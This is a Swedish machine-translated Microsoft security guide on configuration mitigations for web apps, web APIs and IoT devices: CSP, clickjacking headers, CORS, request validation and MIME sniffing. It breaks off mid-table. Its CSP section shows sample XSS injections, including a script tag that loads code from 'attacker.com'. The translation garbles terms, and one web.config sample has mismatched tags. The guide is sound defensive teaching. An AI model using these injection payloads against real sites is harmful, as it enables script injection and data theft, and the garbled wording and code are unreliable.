---
title: Konfigurations hantering för Microsoft Threat Modeling Tool
titleSuffix: Azure
description: Lär dig mer om konfigurations hantering för Threat Modeling Tool. Se information om minskning och Visa kod exempel.
services: security
documentationcenter: na
author: jegeib
manager: jegeib
editor: jegeib
ms.assetid: na
ms.service: security
ms.subservice: security-develop
ms.workload: na
ms.tgt_pltfrm: na
ms.devlang: na
ms.topic: article
ms.date: 02/07/2017
ms.author: jegeib
ms.custom: devx-track-js, devx-track-csharp
ms.openlocfilehash: 8cbe6b39bda0815c4981c497c07750136bcc9dba
ms.sourcegitcommit: 867cb1b7a1f3a1f0b427282c648d411d0ca4f81f
ms.translationtype: MT
ms.contentlocale: sv-SE
ms.lasthandoff: 03/19/2021
ms.locfileid: "94517492"
---
# <a name="security-frame-configuration-management--mitigations"></a>Säkerhets ram: konfigurations hantering | Åtgärder 
| Produkt/tjänst | Artikel |
| --------------- | ------- |
| **Webb program** | <ul><li>[Implementera en innehålls säkerhets princip (CSP) och inaktivera infogade JavaScript-skript](#csp-js)</li><li>[Aktivera webbläsarens XSS-filter](#xss-filter)</li><li>[ASP.NET-program måste inaktivera spårning och fel sökning före distribution](#trace-deploy)</li><li>[Få till gång till JavaScript-skript från tredje part från betrodda källor](#js-trusted)</li><li>[Se till att de autentiserade ASP.NET-sidorna innehåller försvars-eller klicknings skydd](#ui-defenses)</li><li>[Se till att endast betrodda ursprung är tillåtna om CORS är aktiverat på ASP.NET-webbprogram](#cors-aspnet)</li><li>[Aktivera ValidateRequest-attribut på ASP.NET-sidor](#validate-aspnet)</li><li>[Använd lokalt värdbaserat de senaste versionerna av JavaScript-bibliotek](#local-js)</li><li>[Inaktivera automatisk MIME-identifiering](#mime-sniff)</li><li>[Ta bort standard server rubriker på Windows Azure-webbplatser för att undvika finger avtryck](#standard-finger)</li></ul> |
| **Databas** | <ul><li>[Konfigurera en Windows-brandvägg för databas motor åtkomst](#firewall-db)</li></ul> |
| **Webb-API** | <ul><li>[Se till att endast betrodda ursprung är tillåtna om CORS är aktiverat på ASP.NET webb-API](#cors-api)</li><li>[Kryptera avsnitt i webb-API: s konfigurationsfiler som innehåller känsliga data](#config-sensitive)</li></ul> |
| **IoT-enhet** | <ul><li>[Se till att alla administratörs gränssnitt skyddas med starka autentiseringsuppgifter](#admin-strong)</li><li>[Se till att okänd kod inte kan köras på enheter](#unknown-exe)</li><li>[Kryptera OS och ytterligare partitioner med IoT-enheter med bit Locker](#partition-iot)</li><li>[Se till att endast de lägsta tjänsterna/funktionerna är aktiverade på enheter](#min-enable)</li></ul> |
| **IoT-fält Gateway** | <ul><li>[Kryptera operativ system och ytterligare partitioner för IoT Field Gateway med bit Locker](#field-bit-locker)</li><li>[Kontrol lera att standard inloggnings uppgifterna för fältet Gateway ändras under installationen](#default-change)</li></ul> |
| **IoT Cloud Gateway** | <ul><li>[Se till att Cloud Gateway implementerar en process för att hålla den inbyggda program varan för anslutna enheter uppdaterad](#cloud-firmware)</li></ul> |
| **Datorns förtroende gränser** | <ul><li>[Se till att enheterna har slut punkts säkerhets kontroller som kon figurer ATS enligt organisations principer](#controls-policies)</li></ul> |
| **Azure Storage** | <ul><li>[Säkerställ säker hantering av åtkomst nycklar för Azure Storage](#secure-keys)</li><li>[Se till att endast betrodda ursprung är tillåtna om CORS är aktiverat i Azure Storage](#cors-storage)</li></ul> |
| **WCF** | <ul><li>[Aktivera WCF-funktionen för tjänst begränsning](#throttling)</li><li>[WCF-information avslöjas via metadata](#info-metadata)</li></ul> | 

## <a name="implement-content-security-policy-csp-and-disable-inline-javascript"></a><a id="csp-js"></a>Implementera en innehålls säkerhets princip (CSP) och inaktivera infogade JavaScript-skript

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webbprogram | 
| **SDL-fas**               | Skapa |  
| **Tillämpliga tekniker** | Allmänna |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | [En introduktion till innehålls säkerhets principer](https://www.html5rocks.com/en/tutorials/security/content-security-policy/), [referens för innehålls säkerhets principer](https://content-security-policy.com/), [säkerhetsfunktioner](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [Introduktion till INNEHÅLLS säkerhets princip](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy), [kan jag använda CSP?](https://caniuse.com/#feat=contentsecuritypolicy) |
| **Steg** | <p>Innehålls säkerhets princip (CSP) är en säkerhetsmekanism för djupgående säkerhet, en W3C-standard, som gör det möjligt för webb program ägare att ha kontroll över innehållet som är inbäddat på deras webbplats. CSP läggs till som ett HTTP-svarshuvuden på webb servern och tillämpas på klient sidan av webbläsare. Det är en lista-baserad princip – en webbplats kan deklarera en uppsättning betrodda domäner från vilka aktivt innehåll, till exempel Java Script, kan läsas in.</p><p>CSP ger följande säkerhets fördelar:</p><ul><li>**Skydd mot XSS:** Om en sida är sårbar för XSS kan en angripare utnyttja den på två sätt:<ul><li>Mata in `<script>malicious code</script>` . Denna sårbarhet fungerar inte på grund av CSP: s bas begränsning-1</li><li>Mata in `<script src="http://attacker.com/maliciousCode.js"/>` . Denna sårbarhet fungerar inte eftersom den angripare som har kontrollerat domänen inte finns i KRYPTOGRAFIPROVIDERns lista över tillåtna domäner</li></ul></li><li>**Kontroll över data exfiltrering:** Om skadligt innehåll på en webb sida försöker ansluta till en extern webbplats och stjäla data avbryts anslutningen av CSP. Detta beror på att mål domänen inte är i KRYPTOGRAFIPROVIDERns lista över tillåtna</li><li>**Skydd mot klicknings uttag:** klicknings uttag är en angrepps teknik som en angripare kan använda för att rama in en äkta webbplats och tvinga användare att klicka på gränssnitts element. För närvarande skydd mot klicknings uttag uppnås genom att konfigurera ett svars huvud – X-ram-alternativ. Det är inte alla webbläsare som respekterar den här rubriken och vidarebefordran CSP är ett standard sätt att försvara mot klicknings uttag</li><li>**Attack rapportering i real tid:** Om det finns en injektions attack på en CSP-aktiverad webbplats, kommer webbläsare automatiskt att utlösa ett meddelande till en slut punkt som kon figurer ATS på webb servern. På så sätt fungerar CSP som ett varnings system i real tid.</li></ul> |

### <a name="example"></a>Exempel
Exempel princip: 
```csharp
Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
```
Med den här principen kan skript endast läsas in från webb programmets Server och Google Analytics-Server. Skript som läses in från andra platser kommer att avvisas. När CSP är aktiverat på en webbplats inaktive ras följande funktioner automatiskt för att minska XSS-attacker. 

### <a name="example"></a>Exempel
Infogade skript körs inte. Följande är exempel på infogade skript 
```javascript
<script> some Javascript code </script>
Event handling attributes of HTML tags (e.g., <button onclick="function(){}">
javascript:alert(1);
```

### <a name="example"></a>Exempel
Strängar kommer inte att utvärderas som kod. 
```javascript
Example: var str="alert(1)"; eval(str);
```

## <a name="enable-browsers-xss-filter"></a><a id="xss-filter"></a>Aktivera webbläsarens XSS-filter

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webbprogram | 
| **SDL-fas**               | Skapa |  
| **Tillämpliga tekniker** | Allmänna |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | [Filter för XSS-skydd](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) |
| **Steg** | <p>Konfiguration av svars huvud för X-XSS-skydd styr webbläsarens skript filter mellan platser. Det här svars huvudet kan ha följande värden:</p><ul><li>`0:` Då inaktive ras filtret</li><li>`1: Filter enabled` Om en skript attack för Cross-Site identifieras, för att stoppa angreppet, kommer webbläsaren att sanera Sidan</li><li>`1: mode=block : Filter enabled`. I stället för att göra sidan sanerad kommer webbläsaren att förhindra åter givning av sidan när ett XSS-angrepp upptäcks.</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. Webbläsaren kommer att sanera sidan och rapportera överträdelsen.</li></ul><p>Det här är en krom funktion som använder CSP-överträdelse-rapporter för att skicka information till en valfri URI. De sista två alternativen betraktas som säkra värden.</p>|

## <a name="aspnet-applications-must-disable-tracing-and-debugging-prior-to-deployment"></a><a id="trace-deploy"></a>ASP.NET-program måste inaktivera spårning och fel sökning före distribution

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webbprogram | 
| **SDL-fas**               | Skapa |  
| **Tillämpliga tekniker** | Allmänna |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | [Översikt över ASP.net-fel sökning](/previous-versions/ms227556(v=vs.140)), [Översikt över ASP.net spårning](/previous-versions/bb386420(v=vs.140)), [How to: Aktivera spårning för ett ASP.NET-program](/previous-versions/0x5wc973(v=vs.140)), [How to: Aktivera fel sökning för ASP.NET-program](https://msdn.microsoft.com/library/e8z01xdh(VS.80).aspx) |
| **Steg** | När spårning har Aktiver ATS för sidan får alla webbläsare som begär den även spårnings information som innehåller information om internt Server tillstånd och arbets flöde. Denna information kan vara säkerhets känslig. När fel sökning har Aktiver ATS för sidan resulterar fel på servern i en fullständig stack spårnings data som visas i webbläsaren. Dessa data kan exponera säkerhets känslig information om serverns arbets flöde. |

## <a name="access-third-party-javascripts-from-trusted-sources-only"></a><a id="js-trusted"></a>Få till gång till JavaScript-skript från tredje part från betrodda källor

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webbprogram | 
| **SDL-fas**               | Skapa |  
| **Tillämpliga tekniker** | Allmänna |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | Ej tillämpligt  |
| **Steg** | JavaScript-program från tredje part ska endast refereras från betrodda källor. Referens slut punkter bör alltid finnas i TLS. |

## <a name="ensure-that-authenticated-aspnet-pages-incorporate-ui-redressing-or-click-jacking-defenses"></a><a id="ui-defenses"></a>Se till att de autentiserade ASP.NET-sidorna innehåller försvars-eller klicknings skydd

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webbprogram | 
| **SDL-fas**               | Skapa |  
| **Tillämpliga tekniker** | Allmänna |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | [OWASP Klicka-lathund blad](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html), [IE-skydd – bekämpa klickning-uttag med X-bildruta-alternativ](/archive/blogs/ieinternals/combating-clickjacking-with-x-frame-options) |
| **Steg** | <p>Klicka på-uttag, även kallat en "UI-attack", är när en angripare använder flera genomskinliga eller ogenomskinliga lager för att lura användaren att klicka på en knapp eller länk på en annan sida när han eller hon skulle klicka på sidan på den översta nivån.</p><p>Denna skiktning uppnås genom att en skadlig sida skapas med en iframe, som läser in sidan med offerter. Det innebär att angriparen är "kapa"-klickningar avsedda för sina sidor och dirigerar dem till en annan sida, som troligen ägs av ett annat program, en domän eller både och. För att förhindra klicknings uttag, anger du rätt HTTP-svarshuvuden i X-bildruta-alternativ som instruerar webbläsaren att inte tillåta ramar från andra domäner</p>|

### <a name="example"></a>Exempel
Rubriken X-ram-alternativ kan anges via IIS-web.config. Web.config kodfragment för webbplatser som aldrig ska vara inramade: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="DENY"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

### <a name="example"></a>Exempel
Web.config kod för platser som endast ska inramas av sidor i samma domän: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="SAMEORIGIN"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-aspnet-web-applications"></a><a id="cors-aspnet"></a>Se till att endast betrodda ursprung är tillåtna om CORS är aktiverat på ASP.NET-webbprogram

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webbprogram | 
| **SDL-fas**               | Skapa |  
| **Tillämpliga tekniker** | Webb formulär, MVC5 |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | Ej tillämpligt  |
| **Steg** | <p>Webbläsarskydd förhindrar att en webbsida gör AJAX-begäranden till en annan domän. Den här begränsningen kallas samma ursprungs princip och förhindrar att en skadlig webbplats läser känsliga data från en annan plats. Ibland kan det dock vara nödvändigt att exponera API: er på ett säkert sätt som andra-platser kan använda. Resurs delning mellan ursprung (CORS) är en W3C-standard som gör att en server kan öka principen för samma ursprung. Med hjälp av CORS kan en server uttryckligen tillåta vissa cross-origin-begäranden medan andra nekas.</p><p>CORS är säkrare och mer flexibel än tidigare tekniker, till exempel JSONP. På grund av detta är det möjligt att aktivera CORS översätter för att lägga till ett fåtal HTTP-svarshuvuden (Access-Control-*) till webb programmet och detta kan göras på ett par olika sätt.</p>|

### <a name="example"></a>Exempel
Om åtkomst till Web.config är tillgänglig kan CORS läggas till via följande kod: 
```XML
<system.webServer>
    <httpProtocol>
      <customHeaders>
        <clear />
        <add name="Access-Control-Allow-Origin" value="https://example.com" />
      </customHeaders>
    </httpProtocol>
```

### <a name="example"></a>Exempel
Om åtkomst till web.config inte är tillgänglig kan CORS konfigureras genom att lägga till följande CSharp-kod: 
```csharp
HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "https://example.com")
```

Observera att det är viktigt att se till att listan över ursprung i attributet "åtkomst kontroll-Tillåt-ursprung" är inställd på en begränsad och betrodd uppsättning ursprung. Om du inte konfigurerar detta på ett felaktigt sätt (t. ex. genom att ange värdet "*") kan skadliga webbplatser utlösa kors ursprungs begär anden till webb programmet >utan begränsningar, vilket gör programmet sårbart för CSRF-attacker. 

## <a name="enable-validaterequest-attribute-on-aspnet-pages"></a><a id="validate-aspnet"></a>Aktivera ValidateRequest-attribut på ASP.NET-sidor

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webbprogram | 
| **SDL-fas**               | Skapa |  
| **Tillämpliga tekniker** | Webb formulär, MVC5 |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | [Begär validering-förhindra skript attacker](https://www.asp.net/whitepapers/request-validation) |
| **Steg** | <p>Verifiering av begäran, en funktion i ASP.NET eftersom version 1,1, förhindrar att servern accepterar innehåll som innehåller kodad HTML. Den här funktionen är utformad för att hjälpa till att förhindra vissa skript för skript inmatning där klient skript kod eller HTML kan vara osäkert skickade till en server, lagras och sedan visas för andra användare. Vi rekommenderar fortfarande starkt att du validerar alla indata och HTML-kod när det är lämpligt.</p><p>Verifiering av begäran utförs genom att jämföra alla indata till en lista över potentiellt farliga värden. Om en matchning inträffar genererar ASP.NET en `HttpRequestValidationException` . Som standard är funktionen för verifiering av förfrågningar aktive rad.</p>|

### <a name="example"></a>Exempel
Den här funktionen kan dock inaktive ras på sidnivå: 
```XML
<%@ Page validateRequest="false" %> 
```
eller, på program nivå 
```XML
<configuration>
   <system.web>
      <pages validateRequest="false" />
   </system.web>
</configuration>
```
Observera att verifierings funktionen för begäran inte stöds och att den inte är en del av MVC6-pipeline. 

## <a name="use-locally-hosted-latest-versions-of-javascript-libraries"></a><a id="local-js"></a>Använd lokalt värdbaserat de senaste versionerna av JavaScript-bibliotek

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webbprogram | 
| **SDL-fas**               | Skapa |  
| **Tillämpliga tekniker** | Allmänna |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | Ej tillämpligt  |
| **Steg** | <p>Utvecklare som använder standard JavaScript-bibliotek som JQuery måste använda godkända versioner av vanliga JavaScript-bibliotek som inte innehåller kända säkerhets fel. En bra idé är att använda den senaste versionen av biblioteken, eftersom de innehåller säkerhets korrigeringar för kända sårbarheter i äldre versioner.</p><p>Om den senaste versionen inte kan användas på grund av kompatibilitetsinställningar bör de lägre minimi versionerna användas.</p><p>Godkända minimi versioner:</p><ul><li>**JQuery**<ul><li>JQuery 1.7.1</li><li>JQueryUI 1.10.0</li><li>JQuery validera 1,9</li><li>JQuery Mobile-1.0.1</li><li>JQuery-cykel 2,99</li><li>JQuery DataTables 1.9.0</li></ul></li><li>**Ajax-kontroll verktyg**<ul><li>Ajax-kontroll Toolkit 40412</li></ul></li><li>**ASP.NET webb formulär och Ajax**<ul><li>ASP.NET-webbformulär och Ajax 4</li><li>ASP.NET AJAX 3,5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3,0</li></ul></li></ul><p>Läs aldrig in Java Script Library från externa platser, till exempel offentliga CDN</p>|

## <a name="disable-automatic-mime-sniffing"></a><a id="mime-sniff"></a>Inaktivera automatisk MIME-identifiering

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webbprogram | 
| **SDL-fas**               | Skapa |  
| **Tillämpliga tekniker** | Allmänna |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | [IE8, säkerhets del V: omfattande skydd](/archive/blogs/ie/ie8-security-part-v-comprehensive-protection), [MIME-typ](https://en.wikipedia.org/wiki/Mime_type) |
| **Steg** | Huvudet X-Content-Type-Options är ett HTTP-huvud som gör det möjligt för utvecklare att ange att deras innehåll inte ska vara MIME-sniffed. Den här rubriken är utformad för att minimera MIME-Sniffing attacker. För varje sida som kan innehålla innehåll som kan vara användarvänligt måste du använda HTTP-huvudet X-Content-Type-Options: nosniffer. Om du vill aktivera nödvändigt sidhuvud globalt för alla sidor i programmet kan du göra något av följande|

### <a name="example"></a>Exempel
Lägg till rubriken i web.config-filen om programmet hanteras av Internet Information Services (IIS) 7 och senare. 
```XML
<system.webServer>
<httpProtocol>
<customHeaders>
<add name="X-Content-Type-Options" value="nosniff"/>
</customHeaders>
</httpProtocol>
</system.webServer>
```

### <a name="example"></a>Exempel
Lägg till rubriken via global Application \_ BeginRequest 
```csharp
void Application_BeginRequest(object sender, EventArgs e)
{
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
}
```

### <a name="example"></a>Exempel
Implementera anpassad HTTP-modul 
```csharp
public class XContentTypeOptionsModule : IHttpModule
{
#region IHttpModule Members
public void Dispose()
{
}
public void Init(HttpApplication context)
{
context.PreSendRequestHeaders += newEventHandler(context_PreSendRequestHeaders);
}
#endregion
void context_PreSendRequestHeaders(object sender, EventArgs e)
{
HttpApplication application = sender as HttpApplication;
if (application == null)
  return;
if (application.Response.Headers["X-Content-Type-Options "] != null)
  return;
application.Response.Headers.Add("X-Content-Type-Options ", "nosniff");
}
}
```

### <a name="example"></a>Exempel
Du kan bara aktivera den nödvändiga rubriken för specifika sidor genom att lägga till den i enskilda svar: 

```csharp
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
```

## <a name="remove-standard-server-headers-on-windows-azure-web-sites-to-avoid-fingerprinting"></a><a id="standard-finger"></a>Ta bort standard server rubriker på Windows Azure-webbplatser för att undvika finger avtryck

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webbprogram | 
| **SDL-fas**               | Skapa |  
| **Tillämpliga tekniker** | Allmänna |
| **Attribut**              | EnvironmentType – Azure |
| **Referenser**              | [Ta bort standard server rubriker på Windows Azure-webbplatser](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
| **Steg** | Rubriker som server, X-Powered-by, X-ASPNET-version avslöjar information om servern och de underliggande teknikerna. Vi rekommenderar att du undertrycker dessa huvuden, vilket förhindrar att programmet fingerrar finger avtryck |

## <a name="configure-a-windows-firewall-for-database-engine-access"></a><a id="firewall-db"></a>Konfigurera en Windows-brandvägg för databas motor åtkomst

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Databas | 
| **SDL-fas**               | Skapa |  
| **Tillämpliga tekniker** | SQL Azure, OnPrem |
| **Attribut**              | Ej tillämpligt, SQL-version – V12 |
| **Referenser**              | Konfigurera en [Azure SQL Database brand vägg](../../azure-sql/database/firewall-configure.md)genom att [Konfigurera en Windows-brandvägg för databas motor åtkomst](/sql/database-engine/configure-windows/configure-a-windows-firewall-for-database-engine-access) |
| **Steg** | Brandväggssystem hjälper till att förhindra obehörig åtkomst till datorresurser. För att få åtkomst till en instans av SQL Server Database Engine via en brand vägg måste du konfigurera brand väggen på datorn som kör SQL Server för att tillåta åtkomst |

## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-aspnet-web-api"></a><a id="cors-api"></a>Se till att endast betrodda ursprung är tillåtna om CORS är aktiverat på ASP.NET webb-API

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webb-API | 
| **SDL-fas**               | Skapa |  
| **Tillämpliga tekniker** | MVC 5 |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | [Aktivera cross-origin-begäranden i ASP.net webb-API 2](https://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api), [ASP.net Web API-CORS-stöd i ASP.net Web API 2](/archive/msdn-magazine/2013/december/asp-net-web-api-cors-support-in-asp-net-web-api-2) |
| **Steg** | <p>Webbläsarskydd förhindrar att en webbsida gör AJAX-begäranden till en annan domän. Den här begränsningen kallas samma ursprungs princip och förhindrar att en skadlig webbplats läser känsliga data från en annan plats. Ibland kan det dock vara nödvändigt att exponera API: er på ett säkert sätt som andra-platser kan använda. Resurs delning mellan ursprung (CORS) är en W3C-standard som gör att en server kan öka principen för samma ursprung.</p><p>Med hjälp av CORS kan en server uttryckligen tillåta vissa cross-origin-begäranden medan andra nekas. CORS är säkrare och mer flexibel än tidigare tekniker, till exempel JSONP.</p>|

### <a name="example"></a>Exempel
I App_Start/WebApiConfig.cs lägger du till följande kod i WebApiConfig. register-metoden 
```csharp
using System.Web.Http;
namespace WebService
{
    public static class WebApiConfig
    {
        public static void Register(HttpConfiguration config)
        {
            // New code
            config.EnableCors();

            config.Routes.MapHttpRoute(
                name: "DefaultApi",
                routeTemplate: "api/{controller}/{id}",
                defaults: new { id = RouteParameter.Optional }
            );
        }
    }
}
```

### <a name="example"></a>Exempel
EnableCors-attributet kan tillämpas på åtgärds metoder i en kontrollant enligt följande: 

```csharp
public class ResourcesController : ApiController
{
  [EnableCors("http://localhost:55912", // Origin
              null,                     // Request headers
              "GET",                    // HTTP methods
              "bar",                    // Response headers
              SupportsCredentials=true  // Allow credentials
  )]
  public HttpResponseMessage Get(int id)
  {
    var resp = Request.CreateResponse(HttpStatusCode.NoContent);
    resp.Headers.Add("bar", "a bar value");
    return resp;
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "PUT",                          // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "POST",                         // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
}
```

Observera att det är viktigt att se till att listan över ursprung i EnableCors-attributet har angetts till en begränsad och betrodd uppsättning ursprung. Om du inte konfigurerar detta på ett felaktigt sätt (t. ex. genom att ange värdet "*") kan skadliga webbplatser utlösa kors ursprungs begär anden till API: et utan begränsningar, >därigenom göra API: et sårbart för CSRF-attacker. EnableCors kan anges på styrenhets nivå. 

### <a name="example"></a>Exempel
Om du vill inaktivera CORS på en viss metod i en klass kan du använda attributet DisableCors enligt nedan: 
```csharp
[EnableCors("https://example.com", "Accept, Origin, Content-Type", "POST")]
public class ResourcesController : ApiController
{
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  // CORS not allowed because of the [DisableCors] attribute
  [DisableCors]
  public HttpResponseMessage Delete(int id)
  {
    return Request.CreateResponse(HttpStatusCode.NoContent);
  }
}
```

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webb-API | 
| **SDL-fas**               | Skapa |  
| **Tillämpliga tekniker** | MVC 6 |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | [Aktivera cross-origin-begäranden (CORS) i ASP.NET Core 1,0](https://docs.asp.net/en/latest/security/cors.html) |
| **Steg** | <p>I ASP.NET Core 1,0 kan CORS aktive ras antingen med mellanprogram eller med MVC. När du använder MVC för att aktivera CORS används samma CORS-tjänster, men CORS-mellanprogram är inte.</p>|

**Metod-1** Aktivera CORS med mellanprogram: om du vill aktivera CORS för hela programmet lägger du till CORS-mellanprogram i begär ande pipelinen med hjälp av UseCors-tilläggs metoden. En princip för kors ursprung kan anges när du lägger till CORS-mellanprogram med hjälp av klassen CorsPolicyBuilder. Det finns två sätt att göra detta:

### <a name="example"></a>Exempel
Det första är att anropa UseCors med Lambda. Lambda tar ett CorsPolicyBuilder-objekt: 
```csharp
public void Configure(IApplicationBuilder app)
{
    app.UseCors(builder =>
        builder.WithOrigins("https://example.com")
        .WithMethods("GET", "POST", "HEAD")
        .WithHeaders("accept", "content-type", "origin", "x-custom-header"));
}
```

### <a name="example"></a>Exempel
Det andra är att definiera en eller flera namngivna CORS-principer och sedan välja principen efter namn vid körning. 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =>
    {
        options.AddPolicy("AllowSpecificOrigin",
            builder => builder.WithOrigins("https://example.com"));
    });
}
public void Configure(IApplicationBuilder app)
{
    app.UseCors("AllowSpecificOrigin");
    app.Run(async (context) =>
    {
        await context.Response.WriteAsync("Hello World!");
    });
}
```

**Metod – 2** Aktivera CORS i MVC: utvecklarna kan alternativt använda MVC för att tillämpa specifika CORS per åtgärd, per kontrollant eller globalt för alla kontrollanter.

### <a name="example"></a>Exempel
Per åtgärd: om du vill ange en CORS-princip för en viss åtgärd lägger du till attributet [EnableCors] i åtgärden. Ange princip namnet. 
```csharp
public class HomeController : Controller
{
    [EnableCors("AllowSpecificOrigin")] 
    public IActionResult Index()
    {
        return View();
    }
```

### <a name="example"></a>Exempel
Per kontrollant: 
```csharp
[EnableCors("AllowSpecificOrigin")]
public class HomeController : Controller
{
```

### <a name="example"></a>Exempel
Globalt 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddMvc();
    services.Configure<MvcOptions>(options =>
    {
        options.Filters.Add(new CorsAuthorizationFilterFactory("AllowSpecificOrigin"));
    });
}
```
Observera att det är viktigt att se till att listan över ursprung i EnableCors-attributet har angetts till en begränsad och betrodd uppsättning ursprung. Om du inte konfigurerar detta på ett felaktigt sätt (t. ex. genom att ange värdet "*") kan skadliga webbplatser utlösa kors ursprungs begär anden till API: et utan begränsningar, >därigenom göra API: et sårbart för CSRF-attacker. 

### <a name="example"></a>Exempel
Om du vill inaktivera CORS för en styrenhet eller åtgärd använder du attributet [DisableCors]. 
```csharp
[DisableCors]
    public IActionResult About()
    {
        return View();
    }
```

## <a name="encrypt-sections-of-web-apis-configuration-files-that-contain-sensitive-data"></a><a id="config-sensitive"></a>Kryptera avsnitt i webb-API: s konfigurationsfiler som innehåller känsliga data

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | Webb-API | 
| **SDL-fas**               | Distribution |  
| **Tillämpliga tekniker** | Allmänna |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | Gör så [här: kryptera konfigurations avsnitt i ASP.NET 2,0 med DPAPI](/previous-versions/msp-n-p/ff647398(v=pandp.10)), [Ange en skyddad Konfigurationsprovider](/previous-versions/68ze1hb2(v=vs.140)) [med hjälp av Azure Key Vault för att skydda program hemligheter](/azure/architecture/multitenant-identity/web-api) |
| **Steg** | Konfigurationsfiler som Web.config, appsettings.jspå används ofta för att lagra känslig information, inklusive användar namn, lösen ord, databas anslutnings strängar och krypterings nycklar. Om du inte skyddar den här informationen är ditt program sårbart för angripare eller skadliga användare som erhåller känslig information, till exempel användar namn och lösen ord för kontot, databas namn och Server namn. Med hjälp av distributions typen (Azure/on-lokal) krypterar du de känsliga delarna av config-filerna med DPAPI eller tjänster som Azure Key Vault. |

## <a name="ensure-that-all-admin-interfaces-are-secured-with-strong-credentials"></a><a id="admin-strong"></a>Se till att alla administratörs gränssnitt skyddas med starka autentiseringsuppgifter

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | IoT-enhet | 
| **SDL-fas**               | Distribution |  
| **Tillämpliga tekniker** | Allmänna |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | Ej tillämpligt  |
| **Steg** | Alla administrativa gränssnitt som innehåller enhets-eller fält-gatewayen exponeras bör skyddas med starka autentiseringsuppgifter. Dessutom bör alla andra exponerade gränssnitt som WiFi, SSH, fil resurser och FTP skyddas med starka autentiseringsuppgifter. Standard svaga lösen ord ska inte användas. |

## <a name="ensure-that-unknown-code-cannot-execute-on-devices"></a><a id="unknown-exe"></a>Se till att okänd kod inte kan köras på enheter

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | IoT-enhet | 
| **SDL-fas**               | Skapa |  
| **Tillämpliga tekniker** | Allmänna |
| **Attribut**              | Ej tillämpligt  |
| **Referenser**              | [Aktivera säker start och enhets kryptering på enhets lås i Windows 10 IoT Core](/windows/iot-core/secure-your-device/securebootandbitlocker) |
| **Steg** | UEFI-säker start begränsar systemet till att endast tillåta körning av binärfiler som signerats av en angiven utfärdare. Den här funktionen förhindrar att okänd kod körs på plattformen och kan eventuellt minska säkerhets position. Aktivera UEFI-säker start och begränsa listan över certifikat utfärdare som är betrodda för signerings kod. Signera all kod som har distribuerats på enheten med hjälp av en av de betrodda certifikat utfärdarna. |

## <a name="encrypt-os-and-additional-partitions-of-iot-device-with-bit-locker"></a><a id="partition-iot"></a>Kryptera OS och ytterligare partitioner med IoT-enheter med bit Locker

| Rubrik                   | Information      |
| ----------------------- | ------------ |
| **Komponent**               | IoT-enhet | 
| **SDL-fas**               | Skapa |  
| **Tillämpliga tekniker** | Allmänna |
